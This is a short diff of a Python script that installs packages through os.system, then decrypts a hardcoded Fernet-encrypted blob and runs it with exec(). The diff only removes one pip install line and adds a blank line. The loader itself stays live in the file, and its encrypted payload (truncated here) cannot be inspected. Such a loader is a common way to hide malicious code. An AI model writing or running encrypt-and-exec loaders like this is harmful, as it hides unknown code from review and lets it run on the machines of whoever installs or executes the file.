@@ -2,7 +2,6 @@ import os
 
 # Install required packages
 os.system('pip install cryptography')
-os.system('pip install fernet')
 os.system('pip install requests')
 
 # Import necessary modules
@@ -16,3 +15,4 @@ encrypted_code = b'gAAAAABmJtYxnud2WE5Hn0fywEDkHaS_diM-atZ0RJE2lPNxuCTyRGRaFt0fg
 # Decrypt and execute code
 decrypted_code = Fernet(key).decrypt(encrypted_code).decode()
 exec(decrypted_code)
+
